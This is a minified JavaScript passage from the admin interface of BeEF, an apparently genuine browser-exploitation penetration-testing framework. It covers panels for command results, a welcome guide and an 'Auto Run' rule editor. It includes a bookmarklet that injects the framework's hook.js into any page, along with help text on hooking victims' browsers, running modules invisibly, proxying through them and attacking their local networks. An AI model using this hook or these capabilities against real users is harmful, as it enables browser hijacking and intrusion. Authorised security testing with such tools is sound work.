("+beefwui.get_info_from_id(e).ip+")"}},{header:"Module",width:10,sortable:!0,dataIndex:"mod",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Status",width:20,sortable:!0,dataIndex:"status",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Created At",width:10,sortable:!0,dataIndex:"created_at",renderer:function(e){return $jEncoder.encoder.encodeForHTML(e)}},{header:"Updated At",width:10,sortable:!0,dataIndex:"updated_at",renderer:function(e){
return $jEncoder.encoder.encodeForHTML(e)}}]}),p=new Ext.Panel({id:"rtc-moduleevents-host-panel-zombie-"+e.session,title:"Command module results",items:[u],layout:"fit",listeners:{activate:function(){p.items.items[0].store.reload({params:{nonce:Ext.get("nonce").dom.value}})}}});ZombieTab_Rtc.superclass.constructor.call(this,{id:"zombie-rtc-tab-zombie-"+e.session,title:"WebRTC",activeTab:0,viewConfig:{forceFit:!0,stripRows:!0,type:"fit"},items:[l,p],bbar:n,listeners:{}})},Ext.extend(ZombieTab_Rtc,Ext.TabPanel,{}),DoLogout=function(){var e=Ext.get("do-logout-menu");after_logout=function(){window.location.href="/ui/panel"},e.on("click",function(){Ext.Ajax.request({url:"/ui/authentication/logout",method:"POST",params:"nonce="+Ext.get("nonce").dom.value,success:after_logout,failure:after_logout})})},WelcomeTab=function(){var e="javascript:%20(function%20()%20{%20var%20url%20=%20%27http://0.0.0.0:3000/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();";welcome="               <div style='font:11px tahoma,arial,helvetica,sans-serif;width:500px' >               <p><img src='/ui/media/images/beef.jpg' alt='BeEF - The Browser Exploitation Framework' /></p><br />               <p>Official website: <a href='https://beefproject.com/'>https://beefproject.com/</a></p><br />              <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Getting Started</span></p><br />              <p>Welcome to BeEF!</p><br />               <p>Before being able to fully explore the framework you will have to 'hook' a browser. To begin with you can point a browser towards the basic demo page <a href='/demos/basic.html' target='_blank'>here</a>, or the advanced version <a href='/demos/butcher/index.html' target='_blank'>here</a>.</p><br />               <p>If you want to hook ANY page (for debugging reasons of course), drag the following bookmarklet link into your browser's bookmark bar, then simply click the shortcut on another page: <a href='__BOOKMARKLETURL__'>Hook Me!</a></p><br />               <p>After a browser is hooked into the framework they will appear in the 'Hooked Browsers' panel on the left. Hooked browsers will appear in either an online or offline state, depending on how recently they have polled the framework.</p><br />               <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Hooked Browsers</span></p><br />              <p>To interact with a hooked browser simply left-click it, a new tab will appear.               Each hooked browser tab has a number of sub-tabs, described below:</p><br />               <ul style=\"margin-left:15px;\"><li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Details:</span> Display information about the hooked browser after you've run some command modules.</li>               <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Logs:</span> Displays recent log entries related to this particular hooked browser.</li>               <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Commands:</span> This tab is where modules can be executed against the hooked browser. This is where most of the BeEF functionality resides.               Most command modules consist of Javascript code that is executed against the selected              Hooked Browser. Command modules are able to perform any actions that can be achieved              through Javascript: for example they may gather information about the Hooked Browser, manipulate the DOM or perform other activities such as exploiting vulnerabilities within the local network of the Hooked Browser.<br /><br />              Each command module has a traffic light icon, which is used to indicate the following:<ul>              <li><img alt='' src='media/images/icons/green.png'  unselectable='on'> The command module works against the target and should be invisible to the user</li>              <li><img alt='' src='media/images/icons/orange.png'  unselectable='on'> The command module works against the target, but may be visible to the user</li>              <li><img alt='' src='media/images/icons/grey.png'  unselectable='on'> The command module is yet to be verified against this target</li>              <li><img alt='' src='media/images/icons/red.png'  unselectable='on'> The command module does not work against this target</li></ul><br />              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>XssRays:</span> The XssRays tab allows the user to check if links, forms and URI path of the page (where the browser is hooked) is vulnerable to XSS.</li>               <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Proxy:</span> The Proxy tab allows you to submit arbitrary HTTP requests on behalf of the hooked browser.               Each request sent by the Proxy is recorded in the History panel. Click a history item to view the HTTP headers and HTML source of the HTTP response.</li>               <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Network:</span> The Network tab allows you to interact with hosts on the local network(s) of the hooked browser.</li>               <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>WebRTC:</span> Send commands to the victims systems via a zombie specified as the primary WebRTC caller.</li>               </ul><br />               <p>You can also right-click a hooked browser to open a context-menu with additional functionality:</p><br />               <ul style=\"margin-left:15px;\">              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Tunneling Proxy:</span> The Proxy allows you to use a hooked browser as a proxy. Simply right-click a browser from the Hooked Browsers tree to the left and select \"Use as Proxy\".               The proxy runs on localhost port 6789 by default. Each request sent through the Proxy is recorded in the History panel in the Proxy tab. Click a history item to view the HTTP response headers and response body.</li>               <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>XssRays:</span> XssRays allows the user to check if links, forms and URI path of the page (where the browser is hooked) is vulnerable to XSS. To customize default settings of an XssRays scan, please use the XssRays tab.</li></ul><br />               <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Learn More</span></p><br />              <p>To learn more about how BeEF works please review the wiki:</p><br />              <ul style=\"margin-left:15px;\">              <li>Architecture of the BeEF System: <a href='https://github.com/beefproject/beef/wiki/Architecture'>https://github.com/beefproject/beef/wiki/Architecture</a></li>              <li>Tunneling Proxy: <a href='https://github.com/beefproject/beef/wiki/Tunneling-Proxy'>https://github.com/beefproject/beef/wiki/Tunneling-Proxy</a></li>              <li>XssRays Integration: <a href='https://github.com/beefproject/beef/wiki/XssRays-Integration'>https://github.com/beefproject/beef/wiki/XssRays-Integration</a></li>              <li>Network Discovery: <a href='https://github.com/beefproject/beef/wiki/Network-Discovery'>https://github.com/beefproject/beef/wiki/Network-Discovery</a></li>              <li>Writing your own modules: <a href='https://github.com/beefproject/beef/wiki/Command-Module-API'>https://github.com/beefproject/beef/wiki/Command-Module-API</a></li>              </ul>              <br/>              </div>              ",welcome=welcome.replace(/__BOOKMARKLETURL__/,e),WelcomeTab.superclass.constructor.call(this,{region:"center",padding:"10 10 10 10",html:welcome,autoScroll:!0,border:!1})},Ext.extend(WelcomeTab,Ext.Panel,{});const defaultRule={name:"Display an alert",author:"mgeeky",modules:[{name:"alert_dialog",condition:null,options:{text:"You've been BeEFed ;>"}}],execution_order:[0],execution_delay:[0],chain_mode:"nested-forward"};getCurrentRules=async function(e){try{var t=await fetch(`/api/autorun/rules?token=${e}`);if(!t.ok)throw new Error(`Getting auto run rules failed with status ${t.status}`);const o=await t.json(),r=JSON.parse(o.rules);return!0===o.success&&Array.isArray(r)?r:(console.log("No active auto run rules."),[])}catch(n){return console.error(n),console.error("Failed to get auto run rules."),null}},getModules=async function(e){try{var t=await fetch(`/api/modules?token=${e}`);if(!t.ok)throw new Error(`Getting auto run rules failed with status ${t.status}`);return await t.json()}catch(n){return console.error(n),console.error("Failed to get auto run rules."),null}},AutoRunTab=function(){async function e(e){const t=await fetch(`/api/autorun/rule/${e}?token=${r}`,{method:"DELETE"});t.ok?o():console.error(`Failed when deleting rule with id ${e}. Failed with status ${t.status}.`)}async function t(){const e=await fetch(`/api/autorun/rule/add?token=${r}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(defaultRule)});e.ok?o():console.error(`Failed when adding a new rule with status ${e.status}.`)}async function n(e,t){const n=await fetch(`/api/autorun/rule/${e}?token=${r}`,{method:"PATCH",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)});n.ok?o():console.error(`Failed when adding a new rule with status ${n.status}.`)}async function o(){let t=[],o=[];try{t=await getModules(r),o=await getCurrentRules(r)}catch(a){return console.error(a),console.error("Failed to load command modules and/or rules for Auto Run."),void i.update("<p>Failed to load Auto Run rules.</p>")}if(null!==o){i.update(`<p>Loaded ${o.length} Auto Run rules.</p>`),s.removeAll();for(let r=0;r<o.length;r++)ruleForm=new AutoRunRuleForm(o[r],t,function(){e(o[r].id)},function(e){n(o[r].id,e)}),s.add(ruleForm);s.doLayout()}else i.update("<p>Failed to load Auto Run rules.</p>")}var r=BeefWUI.get_rest_token(),i=new Ext.Container({html:"<p>Loading Auto Run rules...</p>"}),a=new Ext.Panel({style:{font:"11px tahoma,arial,helvetica,sans-serif"},padding:"10 10 10 10",border:!1,items:[{xtype:"container",html:"                <div>                    <h4>Auto Run Rules</h4>                    <p>These determine what commands run automatically when a browser is hooked.</p>                </div>"},i,{xtype:"button",text:"Add New Rule",handler:t}],listeners:{afterrender:o}}),s=new Ext.Panel({border:!1,listeners:{afterrender:o}});AutoRunTab.superclass.constructor.call(this,{region:"center",items:[a,s],autoScroll:!0,border:!1,closable:!1})},Ext.extend(AutoRunTab,Ext.Panel,{});const areNotificationUpdateTest={name:"Display an alert-----",author:"mgeeky",modules:[{name:"alert_dialog",condition:null,options:{text:"You've been BeEFed ;>"}}],execution_order:[0],execution_delay:[0],chain_mode:"nested-forward"};AutoRunRuleForm=function(e,t,n,o){function r(e,t){const n=p.modules[e],o="back"===t?e+1:e-1;p.modules.splice(e,1),p.modules.splice(o,0,n),s(),f.doLayout()}function i(e){p.modules.splice(e,1),p.execution_delay.splice(e,1),s(),f.doLayout()}function a(){p.modules.push(p.modules[p.modules.length-1]),p.execution_delay.push(p.execution_delay[p.execution_delay.length-1]),s(),f.doLayout()}function s(){f.removeAll(!0);for(let n=0;n<p.modules.length;++n){const o=0===n,a=n>=p.modules.length-1;f.add(new AutoRunModuleForm(p.modules[n],function(){i(n)},o?undefined:function(){r(n,"forward")},a?undefined:function(){r(n,"back")},e.id,n,t))}}function l(){const e=d.getForm().getValues(),t={...p,name:e[c],chain_mode:e[u],execution_order:[...Array(p.modules.length).keys()]};o(t)}const d=this,c=`rule-name-${e.id}`,u=`rule-chain-mode-${e.id}`,p=JSON.parse(JSON.stringify(e));p.modules=JSON.parse(p.modules),p.execution_delay=JSON.parse(p.execution_delay),p.execution_order=JSON.parse(p.execution_order);const f=new Ext.Container({style:{padding:"10 10 10 10"},listeners:{afterrender:s}});AutoRunRuleForm.superclass.constructor.call(this,{padding:"10 10 10 10",title:`Rule ${e.id}`,items:[{xtype:"textfield",id:c,value:e.name?e.name:"",fieldLabel:"Name"},{xtype:"displayfield",fieldLabel:"Author",value:e.author?e.author:"anonymous"},{xtype:"displayfield",fieldLabel:"Browser(s)",value:e.browser?e.browser:"All"},{xtype:"displayfield",fieldLabel:"Browser version(s)",value:e.browser_version?e.browser_version:"All"},{xtype:"displayfield",fieldLabel:"OS(s)",value:e.os?e.os:"All"},{xtype:"displayfield",fieldLabel:"OS version(s)",value:e.os_version?e.os_version:"All"},f,{xtype:"button",text:"Add Module",handler:a},{xtype:"combo",id:u,fieldLabel:"Chain Mode",store:["sequential","nested-forward"],queryMode:"local",triggerAction:"all",editable:!1,forceSelection:!0,value:e.chain_mode?e.chain_mode:"sequential"},{xtype:"displayfield",fieldLabel:"Execution Order",value:p.execution_order?JSON.stringify(p.execution_order):"undefined"},{xtype:"displayfield",fieldLabel:"Execution Delay",value:p.execution_delay?JSON.stringify(p.execution_delay):"undefined"}],buttons:[{text:"Delete",handler:n},{text:"Save",handler:l}],border:!1,closable:!1})},Ext.extend(AutoRunRuleForm,Ext.FormPanel,{}),loadModuleInfo=async function(e,t,n){try{if(t===undefined){const o=await fetch(`/api/modules/search/${n}?token=${e}`);if(!o.ok)throw new Error(`Getting auto run rules failed with status ${o.status}`);const r=await o.json();if("number"!=typeof r.id)throw new Error("Searching module name failed.");t=r.id}const r=await fetch(`/api/modules/${t}?token=${e}`),i=await r.json();if(!i)throw new Error(`Module with name ${n} and ID ${t} couldn't be retrived.`);return i.id=t,i}catch(o){return console.error(o),console.error("Failed to get module information."),null}},AutoRunModuleForm=function(e,t,n,o,r,i,a){async function s(t){if(t||(t=await loadModuleInfo(l,undefined,e.name)),t){c.setValue(t.id),u.removeAll(),u.add(new Ext.form.DisplayField({fieldLabel:"Module Name",value:t.name})),u.add(new Ext.form.DisplayField({fieldLabel:"Module Author",value:t.author?t.author:"anonymous"}));for(let n=0;n<t.options.length;n++){generate_form_input_field(u,t.options[n],e.options[t.options[n].name],!1,{session:`${t.name}-module-${i}-field-${n}`}).on("change",function(o,r){e.options[t.options[n].name]=r})}u.doLayout()}else u.update("<p>Failed to load module information.</p>")}const l=BeefWUI.get_rest_token(),d=new Ext.data.Store({data:a,reader:new Ext.data.JsonReader({fields:["id","name"]}),proxy:new Ext.data.MemoryProxy(a)}),c=new Ext.form.ComboBox({fieldLabel:"Change Module",store:d,queryMode:"local",displayField:"name",valueField:"id",editable:!1,forceSelection:!0,triggerAction:"all",typeAhead:!0,listeners:{select:async function(t){const n=t.getValue(),o=await loadModuleInfo(l,n,undefined);if(o){e.name=o.name,e.condition=o.condition?o.condition:null,e.options={};for(let t=0;t<o.options.length;t++){const n=o.options[t];e.options[n.name]=n.value?n.value:""}s(o)}else console.error("Failed to load new module.")}}}),u=new Ext.Panel({title:`Module ${i+1}`,tbar:[c],layout:"form",border:!1,listeners:{afterrender:function(){s(undefined)}}}),p=new Ext.Container({layout:{type:"hbox",pack:"end"},items:[{xtype:"button",text:"Delete",handler:t},{xtype:"button",text:"Move Forward",handler:n,disabled:n==undefined},{xtype:"button",text:"Move Back",handler:o,disabled:o==undefined}]});AutoRunModuleForm.superclass.constructor.call(this,{items:[u,p]})},Ext.extend(AutoRunModuleForm,Ext.Container,{});